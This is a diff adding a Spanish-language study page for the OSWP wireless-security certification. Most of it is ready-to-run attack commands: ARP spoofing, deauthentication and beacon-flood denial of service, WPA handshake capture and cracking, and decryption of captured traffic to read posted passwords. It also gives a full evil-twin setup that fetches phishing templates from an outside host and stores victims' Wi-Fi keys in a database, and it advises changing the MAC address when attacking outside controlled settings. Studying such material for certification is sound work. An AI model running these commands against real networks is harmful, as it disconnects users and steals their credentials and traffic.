@@ -1,0 +1,626 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<%- include('../utils/head') %>
+
+    <body>
+        <%- include('../utils/navbar') %>
+            <section id="networking">
+                <div class="container mt-4">
+                    <h2>Redes</h2>
+                    <div class="border p-3 rounded mt-3">
+                        <p><strong>
+                            Esto es una guia para la certificacion OSWP
+                        </strong></p>
+                        <hr>
+                        <p>Para ver en profundidad todos los ataques de esta seccion pincha <a target="_blank" href="https://gist.github.com/s4vitar/3b42532d7d78bafc824fb28a95c8a5eb">aqui</a></p>
+                        <p>
+                            <strong class="text-danger">
+                                Si se pretende llevar acabo estos ataques en entornos no controlados se recomienda
+                                encarecidamente cambiar la MAC de nuestro dispositivo.
+                            </strong>
+                            Mira como hacerlo <a href="/herramientas/#macchanger">aqui</a>
+                        </p>
+                        <p>
+                            <strong>MAC Address:</strong> (Media Access Point) Direccion de 48 bits que corresponde de
+                            forma unica a una
+                            tarjeta o dispostivo red. Es unica, permanente y fisica. <br>
+                            <hr>
+                            <strong>Tarjeta de red</strong>
+                        <ul>
+                            <li>
+                                Mode Managed: Modo determinado de todos los wireless. Solo captura los paquetes
+                                dirigidos a la maquina.
+                            </li>
+                            <li>
+                                Mode Monitor: Captura cualquier paquete en el rango de la tarjeta, los que van a la
+                                maquina y los que
+                                no. Aparte de esto, se perdera la conexion a Inernet
+                            </li>
+                        </ul>
+                        </p>
+                    </div>
+
+                    <div class="bg-light p-4 mt-3">
+                        <h4 class="mt-3">ARP (Address Resolution Protocol)</h4>
+                        <div class="border p-3 rounded">
+                            <p>
+                                <strong>Arp:</strong> Asociar la direccion MAC a la direccion IP a la que se quiere
+                                enviar el
+                                trafico<br>
+                                <strong>Broadcast:</strong> Mensaje que se envia a todas las direcciones disponibles en
+                                la red <br>
+                                <strong>DNS:</strong> Resolucion de direcciones IP. Esto hace posible que no tengamos
+                                que recordar las
+                                IPs de los sitios sino simplemente su direccion.
+                            </p>
+                        </div>
+                        <div class="arp-spoofing mt-4" id="arpspoof">
+                            <h5>ARP Poisoning</h5>
+                            <p>
+                                Se basa en aprovechar que el protocolo no tiene nigun tipo de cifrado ya que es
+                                necesario preguntar a
+                                todas las direcciones de red donde esta esa direccion IP.
+                                Se generan paquetes de respuesta automaticos para engañar a la maquina que recibe
+                                paquetes ARP. <br>
+                                Por una parte, es posible cancelarle las conexiones al router de la victima si el
+                                trafico que recibe el
+                                atacante no es redireccionado al router, dejando a la victima sin conexion.
+                                Por otra parte, se podria direccionar el trafico de la victima al router y del router a
+                                la victima. El
+                                usuario no notaria nada extraño pero el atacante recibiria todos los paquetes enviados
+                                tanto del router como del atacante.
+                            </p>
+                            <p>
+                                <strong>Herramientas:</strong> Ettercap, Arpspoof
+                            </p>
+                            <div width="90%">
+                                <img src="/images/arp.jpeg" alt="arp" width="100%">
+                            </div>
+                            <hr>
+                            <h5 class="mt-3">Como se hace</h5>
+                            <p>La MAC del router cambiara y sera MAC de la maquina atacante. Toda la informacion del
+                                target sera mandada
+                                a la MAC del router,
+                                por lo que tambien sera mandada a la maquina del atacante
+                            </p>
+                            <small>Escribir en dos terminales diferentes</small> <br>
+                            <code>arpspoof -i INTERFAZ -t TARGET_IP ROUTER_IP</code> <br>
+                            <code>arpspoof -i INTERFAZ -t ROUTER_IP TARGET_IP</code>
+                            <ul class="mt-2">
+                                <li><strong>INTERFAZ:</strong> Interfaz de red por la que llevas acabo el ataque (wlan0,
+                                    eth0...)</li>
+                                <li><strong>TARGET_IP:</strong> IP de la victima (conseguir con nmap)</li>
+                                <li><strong>ROUTER_IP:</strong> IP del router (conseguir con ifconfig)</li>
+                            </ul>
+                            <div class="border radius p-3">
+                                <p><strong>Activar el port forwarding</strong></p>
+                                <small>Si no se activa, el target no tendra conexion a internet</small><br>
+                                <code>echo 1>/proc/sys/net/ipv4/ip_forward</code>
+                            </div>
+                            <p class="mt-3">Para ver el metodo usando Bettercap pulsa <a
+                                    href="/herramientas/#bettercap">AQUI</a></p>
+                        </div>
+                        <br>
+                        <hr>
+                        <div class="dns-spoofing mt-4">
+                            <h5>DNS Spoofing</h5>
+                            <p>
+                                Alterando las direcciones IP de los servidores DNS puede hacer que la victima apunte a
+                                otros servidores
+                                sin saberlo. Los ataques mas comunes son aquellos en los que se monta un
+                                sitio falso que sea una replica pudiendo asi obtener informacion sensible. Tambien se
+                                pueden hacer
+                                explotacion de algunas vulnerabilidades. Normalmente se realizan los ataques por
+                                medio de los routers mal configurados.
+                            </p>
+                            <div class="d-flex">
+                                <img src="/images/dns-spoofing.png" alt="dn1">
+                                <img src="/images/dns-spoofing2.png" alt="dn2">
+
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="bg-light p-4 mt-3">
+                        <h4 class="mt-3">Packet Sniffing</h4>
+                        <small class="text-danger">Las tarjeta de red debe estar en modo monitor (wlan0mon hace
+                            referencia a la tarjeta
+                            de red en modo monitor aunque el nombre puede variar dependiendo de la maquina)</small>
+                        <div class="aircrack mt-4">
+                            <div class="border rounded p-3" id="guardarEnArchivo">
+                                <p>
+                                    Ver todas las redes diponibles e informacion de estas (Solo 2,4 Ghz)
+                                </p>
+                                <code>airodump-ng wlan0mon</code>
+                                <hr>
+                                <ul>
+                                    <li><strong>BSSID:</strong> MAC de la red</li>
+                                    <li><strong>PWR:</strong> Calidad de la señal (Cuanto mayor sea el numero, mejor
+                                        sera la señal)</li>
+                                    <li> <strong>Beacons:</strong> Numero de pquetes enviados </li>
+                                    <li> <strong>#Data:</strong> Numero de paquetes recolectados </li>
+                                    <li> <strong>#/s:</strong> Numero de paquetes de datos medidos en segundos en los
+                                        ultimos 10
+                                        segundos </li>
+                                    <li><strong>CH:</strong> Canal en el que actua la red</li>
+                                    <li><strong>MB:</strong> Velocidad maxima soportada</li>
+                                    <li><strong>ENC:</strong> Tipo de encriptado (WPA, WPA2, WEP...)</li>
+                                    <li><strong>CIPHER:</strong> Tipo de cifrado</li>
+                                    <li><strong>AUTH:</strong> Tipo de autenticacion</li>
+                                    <li><strong>ESSID:</strong> Nombre de la red</li>
+                                </ul>
+                                <hr>
+
+                                <p>Ver solo wifi seleccionadas y guardarlo en un fichero</p>
+                                <code>airodump-ng --bssid BSSID --channel CANAL --write NombreFichero wlan0mon</code>
+                                <hr>
+
+                                <p>Ver redes con WPS activado</p>
+                                <code>wash --interface wlan0mon</code>
+
+                            </div>
+                            <div class="border rounded p-3 mt-2">
+                                <h5>Redes 2,4 Ghz y 5 Ghz</h5>
+                                <hr>
+                                <p>Descubrir redes de 5 Ghz</p>
+                                <code>airodump-ng --band a wlan0mon</code>
+                                <hr>
+                                <p>Descubrir redes de 2,4 Ghz y 5Ghz. Sera mas lento ya que escanea en ambas bandas</p>
+                                <code>airodump-ng --band abg wlan0mon</code>
+                                <hr>
+                                <ul>
+                                    <li>
+                                        <strong>Redes de 2,4 Ghz</strong>
+                                        <ul>
+                                            <li>Penetra objetos solidos</li>
+                                            <li>Area amplia de cobertura</li>
+                                            <li>Velocidad maxima de 150 mbps</li>
+                                            <li>Rango de datos mas bajo</li>
+                                            <li>Mas propenso a interferencias</li>
+                                        </ul>
+                                    </li>
+                                    <br>
+                                    <li>
+                                        <strong>Redes de 5 Ghz</strong>
+                                        <ul>
+                                            <li>Interferencia insignificante</li>
+                                            <li>Altas velocidades</li>
+                                            <li>Recomendado para el hogar</li>
+                                            <li>Dificultad para penetrar objetos solidos</li>
+                                            <li>Area de cobertura menor</li>
+                                        </ul>
+                                    </li>
+                                </ul>
+                            </div>
+
+                        </div>
+                    </div>
+                    <div class="bg-light mt-3 p-4">
+                        <h4 class="mt-3 mb-4">Ataques a redes WEP/WPA/WPA2</h4>
+
+                        <h5 class="text-primary"><strong>Ataques Activos</strong></h5>
+                        <p>Ataques en los cuales el atacante ejecuta ciertas acciones para comprometer la red</p>
+                        <div class="border rounded p-3 mt-3">
+                            <div class="border rounded p-3 mt-2">
+                                <h5>Ataques a redes WEP (Wired Equivalent Privacity)</h5>
+                                <hr>
+                                <p>1 - Capturar el trafico y almacenarlo en un archivo. <a
+                                        href="#guardarEnArchivo">AQUI</a></a></p>
+                                <p>2 - Buscar KEY FOUND con aircrack-ng y eliminar los dos puntos. Esa seria la clave</p>
+                                <code>aircrack-ng NombreArchivo.cap</code>
+                                <hr>
+                                <p>Para redes menos transitadas hacer un fakeauth</p>
+                                <code>aireplay-ng --fakeauth 0 -a BSSID -h MacInventada wlan0mon</code>
+                            </div>
+                            <div class="border rounded p-3 mt-2">
+                                <h5>Deauthetication Attack</h5>
+                                <small class="text-danger">Mediante este metodo solo tendra resultado en redes WiFi. Para
+                                    hacerlo en otro tipos de redes mirar <a href="/#arpspoof">otro metodo</a></small>
+                                <hr>
+                                <p>Desconectar a cualquier usuario de la red sin necesidad de estar dentro de esta</p>
+                                <p><strong>Necesario tener otra consola abierta monitorizando el AP objetivo, de lo contrario, aireplay no sabra sobre que canal operar y el ataque no funcionara</strong></p>
+                                <code>aireplay-ng --deauth NumeroPaquetes -a BSSID -c TARGET wlan0mon</code>
+                                <ul class="mt-2">
+                                    <li><strong>NumeroPaquetes:</strong> Numero de paquetes de deautenticacion para eliminar
+                                        al cliente.
+                                        Si se lanzan 1000 paquetes, hasta que no se lancen todos los usuarios no tendran
+                                        conexion. <strong class="text-danger">* El valor 0 es sinonimo de enviar un numero infinito de paquetes  *</strong></li>
+                                    <li><strong>BSSID:</strong> BSSID del router a atacar. Se podria usar <strong>-e ESSID</strong> en su defecto</li>
+                                    <li><strong>TARGET:</strong> Si se quiere eliminar a un solo usuario escribir la MAC de
+                                        su
+                                        dispositivo. Si se quiere deautentiar a toda la red, escribir el broadcast address
+                                        de la red
+                                        (FF:FF:FF:FF:FF:FF)</li>
+                                </ul>
+                            </div>
+                            <div class="border rounded p-3 mt-2">
+                                <h5>FakeAuth Attack</h5>
+                                <p>Incluye un cliente falso en la red del router. Inyectar un solo cliente no tiene utilidad
+                                    en las redes WPA/WPA2</p>
+                                <code>aireplay-ng -1 0 -e ESSID -a BSSID -h MacFalsaParaInyectar</code>
+                            </div>
+                            <div class="border rounded p-3 mt-2">
+                                <h5>CTS Frame Attack</h5>
+                                <p>Es un ataque basado en la denegacion de servicio (DoS) que deja inoperativa la red
+                                    durante un largo periodo de tiempo.
+                                    Ninguna estacion dentro de la red podra transmitir paquetes hasta que la estacion base
+                                    les de permiso, es decir, mientras
+                                    estemos realizando el ataque.
+                                </p>
+                                <a href="https://blog.isecauditors.com/2021/03/wi-fi-dos-cts-frame-attack.html"
+                                    target="_blank">Para mas informacion, visita esta pagina</a>
+                                <div class="d-flex justify-content-between" width="90%">
+                                    <img src="images/cts2.jpg" alt="cts1" width="48%">
+                                    <img src="images/cts.jpg" alt="cts2" width="48%">
+                                </div>
+                                <ul class="mt-4">
+                                    <li><strong>RTS:</strong> (Request-to-send) Reserva el canal del AP para un periodo de
+                                        duracion determinado</li>
+                                    <li><strong>CTS:</strong> (Client-to-send) Respuesta del AP a la Estacion. CTS se envia
+                                        a todas las estacoines para decirles que solo 'x' Estacion
+                                        puede transmitir durante ese tiempo, yaque habia reservado previamente</li>
+                                </ul>
+                                <hr>
+                                <h5 class="mt-3">Como se hace</h5>
+                                <ol>
+                                    <li class="mt-3">
+                                        <strong>Wireshark -:</strong> Filtro: wlan.fc.type_subtype==28
+                                    </li>
+                                    <li class="mt-3">
+                                        <strong>Guardar solo una captura -:</strong> Archivo; Exportar paquetes
+                                        especificados; Exportar como -> Wireshark/tcpdump/...-pcap
+                                    </li>
+                                    <li class="mt-3">
+                                        <strong>Abrir captura con ghex -:</strong>
+                                        <code>ghex nombreArchivoWireshark.pcap</code>
+                                    </li>
+                                    <li class="mt-3">
+                                        <ul>
+                                            <li>Ultimo 4 octetos -> FCS</li>
+                                            <li>Los 6 siguientes octetos -> MAC</li>
+                                            <li>Los 2 siguientes octetos -> Duracion</li>
+                                            <li>Los 2 siguientes octetos -> Frame Control</li>
+                                        </ul>
+                                        <img src="images/ghex.jpg" alt="ghex">
+                                    </li>
+                                    <br>
+                                    <li class="mt-3">
+                                        <strong>Reemplazar el tiempo de la peticion por 30 75, </strong> dejando la duracion
+                                        tal y como en la foto de arriba <br>
+                                        <small>El tiempo recomendado es el maximo (30000 milisegundos = 0x7530 en
+                                            hexadecimal)</small>
+                                    </li>
+                                    <li class="mt-3"><strong>Guardar y salir de ghex</strong></li>
+                                    <li class="mt-3">
+                                        <strong>Abrir el archivo en Wireshark</strong> para comprobar que la duracion sea
+                                        correcta (debera ser 30000 milisegundos)
+                                        <br> <code>wireshark NombreArchivo.pcap</code>
+                                    </li>
+                                    <li class="mt-3">
+                                        <strong>Inyectar paquetes</strong><br>
+                                        <code>tcpreplay --intf1=wlan0mon --topspeed --loop=2000 NombreArchivo.pcap</code>
+                                        <ul>
+                                            <li><strong>--intf1 :</strong> Interfaz</li>
+                                            <li><strong>--topspeed :</strong> Maxima velocidad posible</li>
+                                            <li><strong>--loop : </strong> Numero de paquetes enviados. Cada paquete tendra
+                                                la duracion que le especificamos con ghex</li>
+                                        </ul>
+                                    </li>
+                                </ol>
+                            </div>
+                            <div class="border rounded p-3 mt-2">
+                                <h5>Beacon Flood Mode Attack</h5>
+                                <p>Ataque basado en crear numerosos puntos de red (APs). Su utilidad seria inundar el
+                                    espacio aereo de paquetes beacons saturando asi el canal especificado.
+                                    La idea del ataque es anunciar informacion falsa referente al punto de acceso que
+                                    queremos atacar para dañar el espectro de onda de la red en el mismo canal de la red que
+                                    queremos atacar.
+                                    El dispositivo se desconectara dado que se satura el canal
+                                </p>
+                                <p><strong>Herramientas: </strong>mdk3</p>
+                                <hr>
+                                <h5 class="mt-3">Como se hace</h5>
+                                <p>Se puede crear un fichero con el nombre de las redes o simplemente que la herramienta los
+                                    cree</p>
+                                <small>Para crear el fichero en bash con 10 APs:</small> <br>
+                                <code>for i in $(seq 1 10); do echo "NombreRed$i" >> NombreArchivo.txt; done</code>
+                                <br>
+                                <p class="mt-3">Ejecutando el script de mdk3</p>
+                                <code>mdk3 wlan0mon b -f NombreArchivo.txt -a -s 1000 -c NumeroCanal</code>
+                                <hr>
+                                <p>Si no queremos especificar el nombre de las redes</p>
+                                <code>mdk3 wlan0mon b -c 1</code>
+                            </div>
+                            <div class="border rounded p-3 mt-2">
+                                <h5>Disassociation Amok Mode Attack</h5>
+                                <p>Ataque de deautenticacion dirigido</p>
+                                <p><strong>Herramientas:</strong> mdk3</p>
+                                <hr>
+                                <code>mdk3 wlan0mon d -w Fichero -c Canal</code>
+                                <ul class="mt-2">
+                                    <li><strong>Fichero: </strong>Fichero en el que se almacenan las MACs de los clientes a
+                                        desconectar del AP (No añadir la extension del
+                                        al escribirlo en mdk3</li>
+                                </ul>
+                            </div>
+                            <div class="border rounded p-3 mt-2">
+                                <h5>Michael Shutdown Exploitation Attack</h5>
+                                <small class="text-danger">No es un ataque seguro, es decir, no suele tener un uso real sino
+                                    simplemente en APs antiguos y entornos de practica</small>
+                                <p>Busca apagar un router y buscar el reinicio de este</p>
+                                <code>mdk3 wlan0mon m -t MacRouter</code>
+                            </div>
+                        </div>
+
+                        <br>
+                        <br>
+                        <h5 class="text-primary"><strong>Ataques pasivos</strong></h5>
+                        <p>Ataques en los cuales el atacante quiere comprometer la red sin intervenir sino esperando de
+                            forma pasivo el error del cliente</p>
+                        <div class="border rounded p-3 mt-2">
+                            <h5>Probes Requests</h5>
+                            <p>Preguntas que hacen los dispositivos a los ultimos APs a los que han estado conectados
+                                para ejecutar una reconexion automatica</p>
+                            <p>Para ver los Probes Requests que hacen los dispositivos:</p>
+                            <code>tshark -r Captura.cap -Y "wlan.fc.type_subtype==4" 2>/dev/null</code>
+                            <hr>
+                            <h5>Probes Responses</h5>
+                            <p>Respuestas que manda el router para comprobar que los dispositivos que se habian
+                                conectado previamente estan por ahi</p>
+                            <p>Para ver los Probes Responses de los APs:</p>
+                            <code>tshark -r Captura.cap -Y "wlan.fc.type_subtype==5" 2>/dev/null</code>
+                            <hr>
+                            <h5>Association Request</h5>
+                            <p>Peticion de asociacion del cliente al AP</p>
+                            <p>Para ver el paquete en el formato JSON:</p>
+                            <code>tshark -r Captura.cap -Y "wlan.fc.type_subtype==0" -Tjson 2>/dev/null | grep "OCT1 : OCT2 : OCT3"</code>
+                            <hr>
+                            <h5>Association Response</h5>
+                            <p>Respuesta del AP a la asociacion del cliente al punto de acceso</p>
+                            <code>tshark -r Captura.cap -Y "wlan.fc.type_subtype==1" 2>/dev/null</code>
+                            <hr>
+                            <h5>Beacon Frame</h5>
+                            <p>Paquetes para que una estacion(cliente) se pueda conectar al AP</p>
+                            <code>tshark -r Captura.cap -Y "wlan.fc.type_subtype==8" -Tjson 2>/dev/null</code>
+                            <hr>
+                            <h5>Paquete de Autenticacion</h5>
+                            <p>En caso de que la asociacion sea exitosa, se debe ejecutar una autenticacion</p>
+                            <code>tshark -r Captura.cap -Y "wlan.fc.type_subtype==11" -Tfields -e wlan.addr 2>/dev/null</code>
+                            <hr>
+                            <h5>Paquete de Deautenticacion</h5>
+                            <p>Asi podremos ver los paquetes de deautenticacion emitidos al broadcast address</p>
+                            <code>tshark -r Captura.cap -Y "wlan.fc.type_subtype==12" -Tfields -e wlan.da 2>/dev/null | sort -u</code>
+                            <hr>
+                            <h5>Paquete de Desasociacion</h5>
+                            <p></p>
+                            <code>tshark -r Captura.cap -Y "wlan.fc.type_subtype==10" 2>/dev/null</code>
+                        </div>
+
+                        <br>
+                        <br>
+                        <h5 class="text-primary">Hashes</h5>
+                        <div class="border rounded p-3 mt-3">
+                            <h5>Extraer los hashes de las capturas</h5>
+                            <p>Reducira el tamaño del archivo y cambiara la extension para prepararla para usar con john
+                            </p>
+                            <code>aircrack-ng -J nombreNuevo Captura.cap</code> <br>
+                            <code>hccap2john nombreNuevo.hccap > miHash</code>
+                            <div class="border rounded p-3 mt-3">
+                                <h5>Rompiendo el password con John The Ripper</h5>
+                                <p>Diccionario -> /usr/share/wordlists/rockyou.txt</p>
+                                <code>john --wordlist=diccionario.txt miHash</code>
+                            </div>
+                            <div class="border rounded p-3 mt-3">
+                                <h5>Rompiendo el password con Aircrack-ng</h5>
+                                <p>Metodo muchisimo mas rapido</p>
+                                <code>aircrack-ng -w diccionario.txt Captura.cap</code>
+                            </div>
+                            <div class="border rounded p-3 mt-3">
+                                <h5>Extrayendo el Handshake con bettercap (mas sencillo)</h5>
+                                <small class="text-danger">Descargar bettercap de github, descomprimirlo y ubicarnos en
+                                    la carpeta donde lo descomprimimos</small> <br>
+                                <p>Llevar acabo todo el proceso anterior mediante bettercap</p>
+                                <code>./bettercap -iface wlan0mon</code> <small>-> Inicializar bettercap</small><br>
+                                <code>wifi.recon on</code> <small>-> Activar modo reconocimiento</small> <br>
+                                <code>set wifi.show.sort clients desc</code> <small>-> Ordenar clientes de forma
+                                    descendiente</small><br>
+                                <code>set ticker.commands 'clear; wifi.show'</code> <small>-> Automatizar para limpiar
+                                    la pantalla y mostrar las redes disponibles</small><br>
+                                <code>ticker on</code> <small>-> Ver la informacion en tablas ordenadas</small><br>
+                                <code>wifi.recon.channel NUMERO_CANAL</code> <small>-> Filtrar por un canal en
+                                    concreto</small><br>
+                                <code>wifi.deauth BSSID_AP</code> <small>-> Ataque de deautenticacion al AP
+                                    especificando el BSSID</small> <br>
+                                <small>Una vez realizado esto, podremos cerrar bettercap y la herramienta guardara el
+                                    handshake en <code>/root/bettercap-wifi-hanshakes.cap</code> y la podremos explotar
+                                    con las tecnicas vistas anteriormente (John, Aircrack...)</small>
+                            </div>
+                            <hr>
+
+                            <h5>Aumento de la velocidad de computo con Rainbow Tables</h5>
+                            <p>Las rainbow tables son diccionarios de contraseñas ya encriptadas las cuales agilizan el
+                                proceso ya que evitan que la herramienta las tenga que encriptar por nosotros</p>
+                            <!-- <div class="border rounded p-3 mt-3">
+                                <h5>Cowpatty</h5>
+                                <p>Mas lento que aircrack</p>
+                                <code>cowpatty -r Captura.cap -f diccionario.txt -s ESSID</code>
+                            </div> -->
+                            <div class="border rounded p-3 mt-3">
+                                <h5>Airolib</h5>
+                                <p>250.000 passwords por segundos. Crear el Rainbow Table con airolib y romper el
+                                    handshake con aircrack</p>
+                                <code>airolib-ng nombreNuevoArchivo --import passwd diccionarioPasswd.txt</code>
+                                <small>-> Cargar en nombreNuevoArchivo la lista de passwd</small> <br>
+                                <code>airolib-ng nombreNuevoArchivo --import essid diccionarioESSID.txt</code> <small>->
+                                    Cargar en nombreNuevoArchivo la lista de essid</small> <br>
+                                <code>airolib-ng nombreNuevoArchivo --clean all</code> <small>-> Evitar posibles
+                                    problemas</small> <br>
+                                <code>airolib-ng nombreNuevoArchivo --batch</code> <small>-> Generar el diccionario de
+                                    claves precomputadas (Rainbow Tables)</small>
+                                <code>aircrack-ng -r nombreNuevoArchivo Captura.cap</code> <small>-> Con el diccionario
+                                    creado en airolib romper el handshake de Captura.cap con aircrack</small>
+                            </div>
+                            <div class="border rounded p-3 mt-3">
+                                <h5>GenPMK & Cowpatty</h5>
+                                <p>Con GenPMK generas el Rainbow Table y con Cowpatty hace la fuerza bruta. 400000 passwords por segundo</p>
+                                <code>genpmk -f DiccionarioAEncriptar.txt -s NOMBRE_AP -d DiccionarioGenPMK.genpmk</code>
+                                <hr>
+                                <code>cowpatty -d DiccionarioGenPMK.genpmk -r Captura.cap -s NOMBRE_AP</code>
+                            </div>
+                            <div class="border rounded p-3 mt-3">
+                                <h5>Pyrit</h5>
+                                <p>Pyrit con GenPMK y Cowpatty</p>
+                                <small class="text-danger">La herramienta esta desactualizada y en Python 2.7</small>
+                                <p>Pyrit es la herramienta mas veloz si se usa junto a GenPMK y Cowpatty. Sobrepasa el millon de passwords por segundo</p>
+                                <code>pyrit -e NOMBRE_AP -i DiccionarioGenPMK.genpmk -r Captura.cap attack_cowpatty</code>
+                                <hr>
+                                <p>Tambien se pueden hacer ataques por base de datos, pasando las claves del diccionario a una y posteriormente usandola para la explotacion. De 
+                                    esta manera conseguirias aumentar drasticamente la velocidad del ataque. Mas de 24.000.000 de passwords por segundo
+                                </p>
+                                <code>pyrit -i DiccionarioAEncriptar.txt import_passwords</code><br>
+                                <code>pyrit -e NOMBRE_AP create_essid</code><br>
+                                <code>pyrit batch</code><br>
+                                <code>pyrit -r Captura.cap attack_db</code> <small>-> No hay que especificar el fichero porque esta cargado en la db de pyrit</small>
+                            </div>
+                        </div>
+
+                        <br>
+                        <br>
+                        <h5 class="text-primary">Espionaje</h5>
+                        <p>Buscar informacion interna sin estar conectado al AP</p>
+                        <div class="border rounded p-3 mt-3">
+                            <div class="border rounded p-3 mt-3">
+                                <h5>Airdecap-ng</h5>
+                                <p>Desencriptar paquetes WPA de la captura de red aunque no estuvieras conectado</p>
+                                <code>airdecap-ng -e NOMBRE_AP -p PASSWD_AP Captura.cap</code>
+                                <hr>
+                                <p>Esto generara un archivo, Captura-dec.cap, el cual analizaremos con tshark</p>
+                                <code>tshark -r Captura-dec.cap -Y "http" 2>/dev/null</code> <small>-> Ver trafico http</small> <br>
+                                <code>tshark -r Captura-dec.cap -Y "dns" 2>/dev/null</code> <small>-> Ver paginas por las que navega</small> <br>
+                                <code>tshark -r Captura-dec.cap -Y "http.request.method==POST" -Tfields -e http.file_data 2>/dev/null</code> <small>-> Peticiones POST http (Donde viajan los passwd)</small> <br>
+                            </div>
+                            <!-- <div class="border rounded p-3 mt-3">
+                                <h5>Funny Attacks</h5>
+
+                            </div> -->
+                            <div class="border rounded p-3 mt-3">
+                                <h5>Eviltwin attack (Manual)</h5>
+                                <small class="text-danger">El ataque solo funciona con tarjetas de red <a href="https://www.google.com/search?rlz=1C1GCEA_enES817ES828&sxsrf=ALeKk011fQO7Qcf1MJNQvHU5Yiw3Au3LpA:1627389265184&q=tarjetas+de+red+alfa&spell=1&sa=X&ved=2ahUKEwjb17-4oYPyAhVFtnEKHV6RBrAQBSgAegQIARA1&biw=1920&bih=937" class="text-decoration-none" target="_blank">ALFA</a> ya que con cualquier otra haria Channel Hopping, provocando no poder ubicar la red en el mismo canal</small>
+                                <p>Asignar por DHCP una ip a la victima</p>
+                                <code>cd /etc</code> <small>->Crear el archivo en la ruta /etc</small> <br>
+                                <code>nano dhcpd.conf</code> <small>-> Aqui estara la configuracion DHCP</small> <br>
+                                <br>
+                                <div class="rounded border p-2">
+                                    <code>
+                                        <p class="text-dark">Escribir en dhcpd.conf</p>
+                                        authoritative; <br>
+                                        default-lease-time 600; <br>
+                                        max-lease-time 7200; <br>
+                                        subnet 192.168.1.128 netmask 255.255.255.128 { <br>
+                                            option subnet-mask 255.255.255.128; <br>
+                                            option broadcast-address 192.168.1.255; <br>
+                                            option routers 192.168.1.129; <br>
+                                            option domain-name-servers 8.8.8.8; <br>
+                                            range 192.168.1.130 192.168.1.140; <br>
+                                        }
+                                    </code>
+                                </div>
+                                <br>
+                                <hr>
+                                <p>Descargar plantillas</p>
+                                <code>wget https://cdn.rootsh3ll.com/u/20180724181033/Rogue_AP.zip</code> <small>-> Comprimido con todas las plantillas</small><br>
+                                <code>unzip Rogue_AP.zip</code> <br>
+                                <hr>
+                                <p>Crear y configurar base de datos</p>
+                                <code>service apache2 start && service mariadb start</code> <small>-> Abrir apache2 y MariaDB</small> <br>
+                                <code>mariadb -u root</code> <small>-> Conectarse a la base de datos</small> <br>
+                                <code>create database rogue_AP</code> <small>-> Crear la db donde estaran las passwords</small> <br>
+                                <code>use rogue_AP;</code> <br>
+                                <code>create table wpa_keys(password1 varchar(32), password2 varchar(32));</code> <small>-> Crear las columnas donde se guardaran las passwords</small> <br>
+                                <code>create user fakeap@localhost identified by 'fakeap';</code> <small>-> Crear el usuario fakeap</small> <br>
+                                <code>grant all privileges on rogue_AP.* to 'fakeap'@'localhost';</code> <small>-> Darle privilegios a fakeap</small> <br>
+                                <hr>
+                                <p>Ahora se debera de montar el AP</p>
+                                <code>airbase-ng -e NOMBRE_AP -c CANAL -P wlan0mon</code> <small>-> El AP debera tener el mismo nombre que el AP que queremos atacar y estar en el mismo canal</small> <br>
+                                <hr>
+                                <p>Definir reglas de IP Tables</p>
+                                <div class="border rounded p-3 mt-2 mb-2">
+                                    <p>Para mas informacion sobre IP Tables ver:
+                                        <ul>
+                                            <li><a href="https://www.linuxito.com/seguridad/793-tutorial-basico-de-iptables-en-linux" target="_blank" class="text-decoration-none">Recurso 1</a></li>
+                                            <li><a href="http://redesdecomputadores.umh.es/iptables.htm" target="_blank" class="text-decoration-none">Recurso 2</a></li>
+                                        </ul>
+                                    </p>
+                                </div>
+                                <code>ifconfig at0 192.168.1.129 netmask 255.255.255.128</code> <br>
+                                <code>route add -net 192.168.1.128 netmask 255.255.255.128 gw 192.168.1.129</code> <br>
+                                <code>echo 1 > /proc/sys/net/ipv4/ip_forward</code> <br>
+                                <div class="border rounded p-2 mt-2">
+                                    <p>Recomendable limpiar las reglas anteriores de las iptables</p>
+                                    <code>iptables --flush</code> <br>
+                                    <code>iptables --table nat --flush</code> <br>
+                                    <code>iptables --delete-chain</code> <br>
+                                    <code>iptables --table nat --delete-chain</code> <br>
+                                    <code>iptables -L</code> <small>-> Comprobar que todo este vacio</small>
+                                </div>
+                                <br>
+                                <code>iptables --table nat --append POSTROUTING --out-interface wlan0mon -j MASQUERADE</code> <small>-> La victima conseguira conexion a internet mediante nuestra wlan0mon, aunque podria ser eth0</small> <br>
+                                <code>iptables --append FORWARD --in-interface at0 -j ACCEPT</code> <small>-> No exita interrupcion en el flujo de paquetes</small> <br>
+                                <code>iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $(hostname -I | awk '{print $1}'):80</code> <small>-> Cuando la victima se conecte al puerto 80 quiero que se redirija al AP por mi puerto 80</small> <br>
+                                <code>iptables -t nat -A POSTROUTING -j MASQUERADE</code>
+                                <hr>
+                                <p>Desplegar el ataque</p>
+                                <code>cd /etc</code> <br>
+                                <code>touch /var/lib/dhcp/dhcpd.lease</code>
+                                <code>dhcpd -cf /etc/dhcpd.conf -pf /var/run/dhcpd.pid at0</code>
+                            </div>
+                            <div class="border rounded p-3 mt-3">
+                                <h5>EvilTwin Attack (evilTrust)</h5>
+                                <small class="text-danger">Este metodo funciona con cualquier tarjeta que soporte el modo monitor</small>
+                                <p>EvilTrust es una herramienta open source la cual automatiza el ataque EvilTwin</p>
+                                <a class="text-decoration-none" target="_blank" href="https://github.com/s4vitar/evilTrust">Link de descarga</a>
+                            </div>
+                            <div class="border rounded p-3 mt-3">
+                                <h5>Ataques a redes sin clientes</h5>
+                                <br>
+                                <div class="border rounded p-3">
+                                    <h5>Ataque mediante hcxdumptool</h5>
+                                    <code>hcxdumptool -i wlan0mon -o ArchivoGuardarTodo --enable_status=1</code>
+                                    <br>
+                                    <ul>
+                                        <li><strong>-i : </strong> Interfaz de red</li>
+                                        <li><strong>-o : </strong>Archivo donde guardar los hashes </li>
+                                        <li><strong>--enable_status=1 : </strong> Evitar errores</li>
+                                    </ul>
+                                    <hr>
+                                    <code>hcxpcaptool -z ArchivoGuardarHashes ArchivoGuardarTodo</code>
+                                </div>
+                            </div>
+                        </div> 
+
+                        <br>
+                        <br>
+                        <h5 class="text-primary">Ataques WEP y WPS</h5>
+                        <p>Ataques muy poco comunes actualmente</p>
+                        <div class="border rounded p-3 mt-3">
+                            <h5>WPS (WiFi Protected Setup)</h5>
+                            <p>Manera de conectarse a una red introduciendo un pin de 8 digitos</p>
+                            <p class="text-danger"><strong>WPSPinGenerator</strong> Herramienta disponible en WifiSlax</p>
+                            <code>Buscar objetivos (Opcion 1)</code> <small>-> SI en columna generico, significa que tiene WPS activado</small>
+                            <hr>
+                            <h5>WEP</h5>
+                            <p>Muy desactualizado</p>
